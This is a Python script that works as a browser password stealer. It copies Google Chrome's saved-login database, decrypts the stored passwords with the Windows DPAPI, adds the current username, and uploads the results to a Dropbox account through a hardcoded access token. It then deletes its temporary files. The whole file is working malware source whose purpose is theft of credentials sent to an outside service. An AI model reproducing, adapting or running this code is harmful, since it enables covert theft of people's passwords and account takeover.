import json
import os
import sqlite3
import shutil
import getpass
import dropbox
import random
try:
    import win32crypt
except:
    pass

def main():
    send()


def getpasswords():

    dataToBeSent = {}
    dataList = []
    path = getpath()
    try:
        connection = sqlite3.connect(path+'\Login Data')
        cursor = connection.cursor()
        v = cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins')
        value = v.fetchall()

        for origin_url, username, password in value:
            password = win32crypt.CryptUnprotectData(
                password, None, None, None, 0)[1]

            if password:
                dataList.append({
                    'origin_url': origin_url,
                    'username': username,
                    'password': str(password)[2:-1]
                })

	
		

    except sqlite3.OperationalError as e:
        e = str(e)
        if (e == 'database is locked'):
            print('[!] Make sure Google Chrome is not running in the background')
        elif (e == 'no such table: logins'):
            print('[!] Something wrong with the database name')
        elif (e == 'unable to open database file'):
            print('[!] Something wrong with the database path')
        else:
            print(e)

    dataToBeSent["user"] = getpass.getuser()
    dataToBeSent["passwords"] = dataList
    return dataToBeSent
    
def send():

    jsonData = getpasswords()
    #Get your access code form dropbox to use it here.
    dbx=dropbox.Dropbox('xZ1QuOK6iBAAAAAAAAAATLG-Uk8R8aC57_ydn4KZOAwXe2dOo7sQ3auJobdJRjlq')
    file_from="c:\prog\Login Data"
    x=random.randint(1,500)
    z=str(x)+'.txt'
    new_f=open(z,'w+')
    new_f.write(str(jsonData.items()))
    new_f.close()
    file_to="/kaunheh/"+z
    with open(z, 'rb') as f:
        dbx.files_upload(f.read(), file_to)
    os.remove(z)
    os.remove(file_from)

def getpath():

	source = os.getenv('localappdata') + \
                   '\\Google\\Chrome\\User Data\\Default\\Login Data'
	target = "C:\prog";
	try: 
		os.mkdir(target)
	except:
		print('f')

	shutil.copy(source, target)
	return target

if __name__== '__main__':
    main()

